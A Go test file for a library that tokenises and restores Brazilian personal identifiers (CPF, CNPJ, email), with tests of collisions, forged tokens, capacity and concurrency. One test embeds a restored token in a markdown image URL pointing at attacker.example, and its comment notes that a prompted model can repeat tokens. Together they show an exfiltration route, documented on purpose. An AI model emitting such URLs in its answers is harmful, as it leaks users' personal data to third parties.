package redactbr

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand/v2"
	"strings"
	"sync"
	"testing"
	"unsafe"

	"github.com/GuilhermeMikin/redactbr/internal/cpf"
)

// Fixtures are generated (see redactor_test.go); none was collected.

func newTestRedactor(t testing.TB, opts ...Option) *Redactor {
	t.Helper()
	r, err := New(opts...)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return r
}

// idSource returns a random source for Session.fill that yields the given ids, in order, and then fails.
func idSource(ids ...string) func([]byte) error {
	return func(b []byte) error {
		if len(ids) == 0 {
			return errors.New("test random source exhausted")
		}
		id := ids[0]
		ids = ids[1:]
		for i := range b {
			b[i] = byte(strings.IndexByte(idAlphabet, id[i]))
		}
		return nil
	}
}

// lowEntropySource cycles through four ids, so that collisions between issued tokens and token-like input
// are likely and the reservation logic is actually exercised.
func lowEntropySource() func([]byte) error {
	ids := []string{"aaaaaaaaaa", "bbbbbbbbbb", "cccccccccc", "dddddddddd"}
	n := 0
	return func(b []byte) error {
		id := ids[n%len(ids)]
		n++
		for i := range b {
			b[i] = byte(strings.IndexByte(idAlphabet, id[i]))
		}
		return nil
	}
}

func mustRedact(t *testing.T, s *Session, text string) string {
	t.Helper()
	out, err := s.Redact(text)
	if err != nil {
		t.Fatalf("Session.Redact: %v", err)
	}
	return out
}

func TestSessionRoundTrip(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	in := "CPF 123.456.789-09, email ana@example.com, CNPJ AB.12C.D34/EF56-02, again 123.456.789-09."
	out := mustRedact(t, s, in)
	for _, v := range []string{"123.456.789-09", "ana@example.com", "AB.12C.D34/EF56-02"} {
		if strings.Contains(out, v) {
			t.Fatalf("redacted text still contains a value (entity of %d bytes)", len(v))
		}
	}
	toks := tokenLiterals(out)
	if len(toks) != 4 || toks[0] != toks[3] || toks[0] == toks[1] || toks[1] == toks[2] {
		t.Fatalf("unexpected tokens: %d tokens, want 4 with the first and last equal", len(toks))
	}
	for i, prefix := range []string{"<CPF_", "<EMAIL_", "<CNPJ_", "<CPF_"} {
		if !strings.HasPrefix(toks[i], prefix) {
			t.Errorf("token %d does not start with %s", i, prefix)
		}
	}
	if got := s.Restore(out); got != in {
		t.Errorf("Restore did not return the original text")
	}
}

func TestSessionSameValueDifferentForms(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	a := mustRedact(t, s, "CPF 123.456.789-09")
	b := mustRedact(t, s, "cpf 12345678909")
	c := mustRedact(t, s, "Email ANA@EXAMPLE.COM, cnpj ab12cd34ef5602")
	d := mustRedact(t, s, "email ANA@example.com, CNPJ AB.12C.D34/EF56-02")
	if strings.TrimPrefix(a, "CPF ") != strings.TrimPrefix(b, "cpf ") {
		t.Error("the formatted and the unformatted CPF got different tokens")
	}
	ct, dt := tokenLiterals(c), tokenLiterals(d)
	if len(ct) != 2 || len(dt) != 2 || ct[0] != dt[0] || ct[1] != dt[1] {
		t.Error("an email differing only in domain case, or a CNPJ in another form, got a different token")
	}
	// A token restores to the form in which the value was first seen.
	if got := s.Restore(strings.TrimPrefix(b, "cpf ")); got != "123.456.789-09" {
		t.Errorf("Restore returned a different form of the value (%d bytes)", len(got))
	}
}

func TestSessionLocalPartIsCaseSensitive(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	a := mustRedact(t, s, "ana@example.com")
	b := mustRedact(t, s, "Ana@example.com")
	if a == b {
		t.Error("addresses with different local parts share a token")
	}
}

func TestSessionsAreIsolated(t *testing.T) {
	r := newTestRedactor(t)
	s1, s2 := r.NewSession(), r.NewSession()
	t1 := mustRedact(t, s1, "123.456.789-09")
	t2 := mustRedact(t, s2, "123.456.789-09")
	if t1 == t2 {
		t.Fatal("two sessions issued the same token for a value")
	}
	if got := s2.Restore("answer: " + t1); got != "answer: "+t1 {
		t.Error("a session restored a token issued by another session")
	}
	if got := r.NewSession().Restore(t1); got != t1 {
		t.Error("a new session restored a token")
	}
}

func TestRestoreLeavesEverythingElseVerbatim(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	s.fill = idSource("k7q2xm9pb3")
	tok := mustRedact(t, s, "123.456.789-09")
	if tok != "<CPF_k7q2xm9pb3>" {
		t.Fatalf("unexpected token format: %d bytes", len(tok))
	}
	for _, text := range []string{
		"<CPF_0000000000>",             // forged: well-formed, never issued
		"<CNPJ_k7q2xm9pb3>",            // right id, wrong entity
		"<CPF_K7Q2XM9PB3>",             // id in uppercase
		"<cpf_k7q2xm9pb3>",             // entity in lowercase
		"<CPF_k7q2xm9pb3 >",            // extra space
		"< CPF_k7q2xm9pb3>",            // extra space
		"<CPF_k7q2xm9pb>",              // id too short
		"<CPF_k7q2xm9pb33>",            // id too long
		"<CPF-k7q2xm9pb3>",             // wrong separator
		"CPF_k7q2xm9pb3",               // no brackets
		"<CPF>", "<CPF_1>", "<CPF_01>", // typed replacement and counter-style tokens
		"<CPF_1 >", "<cpf_1>", "<RANDOMTHING>", "a < b > c", "<<>>",
	} {
		if got := s.Restore(text); got != text {
			t.Errorf("Restore changed %q", text)
		}
	}
	if got := s.Restore("x" + tok + tok + "y"); got != "x123.456.789-09123.456.789-09y" {
		t.Error("adjacent issued tokens were not both restored")
	}
}

// The critical collision case: the user writes text that looks like a token, and the session later picks
// the same random id for a real value. The literal must never become restorable.
func TestPreexistingTokenLiteralNeverGainsAuthority(t *testing.T) {
	const literal = "<CPF_aaaaaaaaaa>"

	t.Run("literal and value in the same input", func(t *testing.T) {
		s := newTestRedactor(t).NewSession()
		s.fill = idSource("aaaaaaaaaa", "bbbbbbbbbb") // the first id drawn equals the literal's
		out := mustRedact(t, s, "Please explain "+literal+". My CPF is 123.456.789-09.")
		if out != "Please explain "+literal+". My CPF is <CPF_bbbbbbbbbb>." {
			t.Fatalf("the session issued a token equal to text from the input")
		}
		answer := "You asked about " + literal + " and your CPF <CPF_bbbbbbbbbb>."
		if got := s.Restore(answer); got != "You asked about "+literal+" and your CPF 123.456.789-09." {
			t.Error("the literal was restored, or the issued token was not")
		}
	})

	t.Run("literal in an earlier input", func(t *testing.T) {
		s := newTestRedactor(t).NewSession()
		s.fill = idSource("aaaaaaaaaa", "bbbbbbbbbb")
		mustRedact(t, s, "Please explain "+literal)
		out := mustRedact(t, s, "My CPF is 123.456.789-09")
		if strings.Contains(out, literal) {
			t.Fatal("the session issued a token that appeared earlier in the input")
		}
		if got := s.Restore(literal); got != literal {
			t.Error("the literal was restored")
		}
	})

	t.Run("issued tokens sent back are not reserved", func(t *testing.T) {
		s := newTestRedactor(t).NewSession()
		first := mustRedact(t, s, "CPF 123.456.789-09")
		again := mustRedact(t, s, first+" and 987.654.321-00")
		if !strings.HasPrefix(again, first+" and <CPF_") {
			t.Fatal("conversation history with issued tokens was altered")
		}
		if got := s.Restore(again); got != "CPF 123.456.789-09 and 987.654.321-00" {
			t.Error("tokens in re-sent history stopped restoring")
		}
	})
}

// A valid token restores whoever wrote it: the random id protects against collisions and guessing, and a
// session has no way to tell who produced a text. This test documents that limit (spec §12.8), which is why
// a session is a trust scope.
func TestValidTokenRestoresWhoeverWritesIt(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	tok := mustRedact(t, s, "123.456.789-09")

	// A user repeats a token they saw: it passes through the session unchanged and is not reserved.
	if got := mustRedact(t, s, "what is "+tok+"?"); got != "what is "+tok+"?" {
		t.Fatal("an issued token in the input was changed")
	}
	// A model, or someone prompting it, repeats the token in an answer.
	if got := s.Restore("the value is " + tok); got != "the value is 123.456.789-09" {
		t.Error("a reproduced token was not restored")
	}
	// Restoration does not look at where the token ended up: a URL gets the value too.
	if got := s.Restore("![x](https://attacker.example/?c=" + tok + ")"); got != "![x](https://attacker.example/?c=123.456.789-09)" {
		t.Error("a token inside a URL was not restored")
	}
}

// Reservation covers text that passes through Session.Redact, whole. Outside that, only the random id
// protects a look-alike (spec §12.3), which these tests make visible by forcing the collision.
func TestReservationLimits(t *testing.T) {
	const literal = "<CPF_aaaaaaaaaa>"
	t.Run("text that never reached the session", func(t *testing.T) {
		s := newTestRedactor(t).NewSession()
		s.fill = idSource("aaaaaaaaaa")
		mustRedact(t, s, "123.456.789-09")
		if got := s.Restore(literal); got != "123.456.789-09" {
			t.Error("expected the forced collision to restore: the session did not see this text before")
		}
	})
	t.Run("a look-alike split across calls", func(t *testing.T) {
		s := newTestRedactor(t).NewSession()
		s.fill = idSource("aaaaaaaaaa")
		mustRedact(t, s, literal[:8])
		mustRedact(t, s, literal[8:])
		if got := mustRedact(t, s, "123.456.789-09"); got != literal {
			t.Error("expected the forced collision: neither call saw the whole look-alike")
		}
	})
}

// Sessions are isolated by their issued sets, not by chance: with the same id drawn in both, each restores
// its own value.
func TestSessionsDrawingTheSameIDKeepTheirValues(t *testing.T) {
	r := newTestRedactor(t)
	s1, s2 := r.NewSession(), r.NewSession()
	s1.fill, s2.fill = idSource("aaaaaaaaaa"), idSource("aaaaaaaaaa")
	t1, t2 := mustRedact(t, s1, "123.456.789-09"), mustRedact(t, s2, "987.654.321-00")
	if t1 != t2 {
		t.Fatal("the test needs both sessions to issue the same token")
	}
	if s1.Restore(t1) != "123.456.789-09" || s2.Restore(t2) != "987.654.321-00" {
		t.Error("a session restored a value from another session")
	}
}

// Tokens are matched byte for byte: no single edit of a token restores anything.
func TestNoSingleByteEditOfATokenRestores(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	s.fill = idSource("k7q2xm9pb3")
	tok := mustRedact(t, s, "123.456.789-09")
	check := func(edited string) {
		t.Helper()
		if !strings.Contains(edited, tok) && s.Restore(edited) != edited { // "<" + tok still holds the token
			t.Errorf("Restore changed an edited token: %q", edited)
		}
	}
	for i := range len(tok) {
		check(tok[:i] + tok[i+1:]) // deletion
		if i+1 < len(tok) {
			check(tok[:i] + tok[i+1:i+2] + tok[i:i+1] + tok[i+2:]) // transposition
		}
		for b := range 256 {
			check(tok[:i] + string([]byte{byte(b)}) + tok[i+1:]) // substitution
			if i > 0 {
				check(tok[:i] + string([]byte{byte(b)}) + tok[i:]) // insertion inside the token
			}
		}
	}
	// A case change as a model might make it, and common rewrites.
	for _, edited := range []string{
		strings.ToUpper(tok), strings.ToLower(tok), "[CPF_k7q2xm9pb3]", "{{CPF_k7q2xm9pb3}}", "&lt;CPF_k7q2xm9pb3&gt;",
		`\u003cCPF_k7q2xm9pb3\u003e`, "</CPF_k7q2xm9pb3>", "<CPF_k7q2xm9pb3/>", "<CPF k7q2xm9pb3>", "< CPF_k7q2xm9pb3 >",
	} {
		check(edited)
	}
}

// The issued token inside a broken one is still found, and nothing else around it changes.
func TestRestoreFindsATokenAfterABrokenOne(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	s.fill = idSource("k7q2xm9pb3")
	mustRedact(t, s, "123.456.789-09")
	for in, want := range map[string]string{
		"<CPF_abc<CPF_k7q2xm9pb3>":       "<CPF_abc123.456.789-09",
		"<<CPF_k7q2xm9pb3>>":             "<123.456.789-09>",
		"<CPF_<CPF_k7q2xm9pb3>":          "<CPF_123.456.789-09",
		"<CPF_k7q2xm9pb<CPF_k7q2xm9pb3>": "<CPF_k7q2xm9pb123.456.789-09",
	} {
		if got := s.Restore(in); got != want {
			t.Errorf("Restore(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestSessionCapacity(t *testing.T) {
	r := newTestRedactor(t, WithMaxSessionValues(2))
	s := r.NewSession()
	tok := mustRedact(t, s, "123.456.789-09 and ana@example.com")
	before := s.String()

	out, err := s.Redact("987.654.321-00")
	if !errors.Is(err, ErrSessionFull) || out != "" {
		t.Fatalf("Redact over capacity returned (%d bytes, %v), want empty output and ErrSessionFull", len(out), err)
	}
	if s.String() != before {
		t.Error("a failed Redact changed the session")
	}
	if got := s.Restore(tok); got != "123.456.789-09 and ana@example.com" {
		t.Error("tokens issued before the failure stopped restoring")
	}
	if _, err := s.Redact("again 123.456.789-09"); err != nil {
		t.Errorf("a known value was rejected by a full session: %v", err)
	}

	// Reserved token-like text counts toward the capacity too.
	s = newTestRedactor(t, WithMaxSessionValues(1)).NewSession()
	if _, err := s.Redact("<CPF_aaaaaaaaaa> <CPF_bbbbbbbbbb>"); !errors.Is(err, ErrSessionFull) {
		t.Errorf("reservations beyond capacity returned %v, want ErrSessionFull", err)
	}
}

func TestSessionFailsClosed(t *testing.T) {
	const value = "123.456.789-09"
	t.Run("random source error", func(t *testing.T) {
		s := newTestRedactor(t).NewSession()
		s.fill = func([]byte) error { return errors.New("entropy unavailable") }
		out, err := s.Redact("CPF " + value)
		if err == nil || out != "" {
			t.Fatalf("Redact returned (%d bytes, %v), want empty output and an error", len(out), err)
		}
		if strings.Contains(err.Error(), value) || strings.Contains(err.Error(), "12345678909") {
			t.Error("the error message contains the value")
		}
		if s.String() != "redactbr.Session{values: 0, reserved: 0}" {
			t.Error("a failed Redact changed the session")
		}
	})
	t.Run("every random id collides", func(t *testing.T) {
		s := newTestRedactor(t).NewSession()
		ids := make([]string, 1+maxTokenAttempts)
		for i := range ids {
			ids[i] = "aaaaaaaaaa"
		}
		s.fill = idSource(ids...)
		mustRedact(t, s, value)
		out, err := s.Redact("987.654.321-00")
		if !errors.Is(err, errTokenCollision) || out != "" {
			t.Fatalf("Redact returned (%d bytes, %v), want empty output and errTokenCollision", len(out), err)
		}
	})
	t.Run("a collision is retried", func(t *testing.T) {
		s := newTestRedactor(t).NewSession()
		s.fill = idSource("aaaaaaaaaa", "aaaaaaaaaa", "cccccccccc")
		if out := mustRedact(t, s, value+" "+"987.654.321-00"); out != "<CPF_aaaaaaaaaa> <CPF_cccccccccc>" {
			t.Errorf("unexpected output after a retried collision")
		}
	})
}

func TestSessionConcurrentUse(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	values := []string{"123.456.789-09", "987.654.321-00", "ana@example.com", "AB.12C.D34/EF56-02"}
	tokens := make([][]string, 32)
	var wg sync.WaitGroup
	for g := range tokens {
		wg.Go(func() {
			for i := range 50 {
				in := fmt.Sprintf("%d: %s / %s", i, values[(g+i)%len(values)], values[(g+2*i)%len(values)])
				out, err := s.Redact(in)
				if err != nil {
					t.Error(err)
					return
				}
				if s.Restore(out) != in {
					t.Error("concurrent round trip failed")
					return
				}
			}
			for _, v := range values {
				out, _ := s.Redact(v)
				tokens[g] = append(tokens[g], out)
			}
		})
	}
	wg.Wait()
	for g := range tokens {
		for i := range values {
			if tokens[g][i] != tokens[0][i] {
				t.Fatal("goroutines saw different tokens for the same value")
			}
		}
	}
}

// Issuing, reserving and streaming at the same time, with ids drawn from a small space so that they often
// collide with look-alikes: every stream restores the session's tokens and nothing else, and no reserved
// string is ever issued.
func TestConcurrentRedactAndStreams(t *testing.T) {
	const goroutines, rounds, space = 16, 50, 10000
	s := newTestRedactor(t, WithMaxSessionValues(1<<20)).NewSession()
	s.fill = func(b []byte) error {
		id := fmt.Sprintf("%010d", rand.IntN(space))
		for i := range b {
			b[i] = byte(strings.IndexByte(idAlphabet, id[i]))
		}
		return nil
	}
	// One id in eight is reserved before anything is issued, so these must stay verbatim in every stream.
	var lookAlikes []string
	for id := 0; id < space; id += 8 {
		lit := fmt.Sprintf("<CPF_%010d>", id)
		lookAlikes = append(lookAlikes, lit)
		mustRedact(t, s, lit)
	}
	var wg sync.WaitGroup
	for g := range goroutines {
		wg.Go(func() {
			for i := range rounds {
				var base [cpf.BaseLen]byte
				copy(base[:], fmt.Sprintf("%09d", g*rounds+i+1))
				dv1, dv2, _ := cpf.CheckDigits(base)
				value := string(base[:3]) + "." + string(base[3:6]) + "." + string(base[6:]) + "-" + string([]byte{dv1, dv2})

				// Text that may or may not be issued by the time it arrives; only the last check covers it.
				tok, err := s.Redact(fmt.Sprintf("<CPF_%010d>", rand.IntN(space)))
				if err == nil {
					tok, err = s.Redact(value)
				}
				if errors.Is(err, errTokenCollision) {
					continue // failing closed is a valid outcome when every draw collides
				}
				if err != nil {
					t.Error(err)
					return
				}
				lit := lookAlikes[(g*rounds+i)%len(lookAlikes)]
				var out bytes.Buffer
				w := s.RestoreWriter(&out)
				for _, c := range strings.SplitAfter("value "+tok+" "+lit+" end", "_") {
					if _, err := w.Write([]byte(c)); err != nil {
						t.Error(err)
						return
					}
				}
				if err := w.Close(); err != nil {
					t.Error(err)
					return
				}
				if want := "value " + value + " " + lit + " end"; out.String() != want {
					t.Errorf("stream restored %q, want %q", out.String(), want)
					return
				}
			}
		})
	}
	wg.Wait()
	for lit := range s.reserved {
		if _, issued := s.values[lit]; issued {
			t.Fatalf("a reserved string was issued: %q", lit)
		}
	}
}

// A session must not keep its inputs alive: stored values and reservations are copies, not substrings.
func TestSessionDoesNotRetainInput(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	in := strings.Repeat("x", 1<<16) + " CPF 123.456.789-09 <CPF_aaaaaaaaaa> " + strings.Repeat("y", 1<<16)
	mustRedact(t, s, in)
	lo := uintptr(unsafe.Pointer(unsafe.StringData(in)))
	hi := lo + uintptr(len(in))
	inside := func(v string) bool {
		p := uintptr(unsafe.Pointer(unsafe.StringData(v)))
		return p >= lo && p < hi
	}
	if len(s.values) != 1 || len(s.reserved) != 1 {
		t.Fatalf("unexpected session state: %v", s)
	}
	for _, v := range s.values {
		if inside(v) {
			t.Error("a stored value points into the input")
		}
	}
	for lit := range s.reserved {
		if inside(lit) {
			t.Error("a reservation points into the input")
		}
	}
}

func TestSessionStringHidesContents(t *testing.T) {
	s := newTestRedactor(t).NewSession()
	tok := mustRedact(t, s, "123.456.789-09")
	for _, got := range []string{
		s.String(), fmt.Sprint(s), fmt.Sprintf("%+v", s), fmt.Sprintf("%#v", s),
		fmt.Sprint(*s), fmt.Sprintf("%+v", *s), fmt.Sprintf("%#v", *s), // dereferenced
		fmt.Sprintf("%+v", struct{ S *Session }{s}), fmt.Sprintf("%+v", struct{ S Session }{*s}), // in a struct
	} {
		if strings.Contains(got, "123") || strings.Contains(got, tok) || strings.Contains(got, "CPF") {
			t.Errorf("formatting a session revealed its contents: %s", got)
		}
	}
	for _, v := range []any{s, *s} {
		if got, err := json.Marshal(v); err != nil || string(got) != "{}" {
			t.Errorf("json.Marshal(%T) = (%s, %v), want an empty object", v, got, err)
		}
	}
	if s.String() != "redactbr.Session{values: 1, reserved: 0}" {
		t.Errorf("String() = %q", s.String())
	}
}

func TestParseToken(t *testing.T) {
	tests := []struct {
		in   string
		n    int
		want tokenStatus
	}{
		{"<", 0, tokenPartial},
		{"<C", 0, tokenPartial},
		{"<CN", 0, tokenPartial},
		{"<CPF_", 0, tokenPartial},
		{"<EMAIL_0123456789", 0, tokenPartial},
		{"<EMAIL_0123456789>", 18, tokenComplete},
		{"<CPF_0123456789>rest", 16, tokenComplete},
		{"<CNPJ_0123456789>", 17, tokenComplete},
		{"<CX", 0, tokenNone},
		{"<CPF_012345678i>", 0, tokenNone}, // i is not in the alphabet
		{"<CPF_0123456789x", 0, tokenNone},
		{"<PHONE_0123456789>", 0, tokenNone},
		{"<cpf_0123456789>", 0, tokenNone},
	}
	for _, tt := range tests {
		n, st := parseToken(tt.in)
		if n != tt.n || st != tt.want {
			t.Errorf("parseToken(%q) = (%d, %d), want (%d, %d)", tt.in, n, st, tt.n, tt.want)
		}
		if n2, st2 := parseToken([]byte(tt.in)); n2 != n || st2 != st {
			t.Errorf("parseToken disagrees between string and []byte for %q", tt.in)
		}
	}
	if maxTokenLen != 18 {
		t.Errorf("maxTokenLen = %d, want 18", maxTokenLen)
	}
}
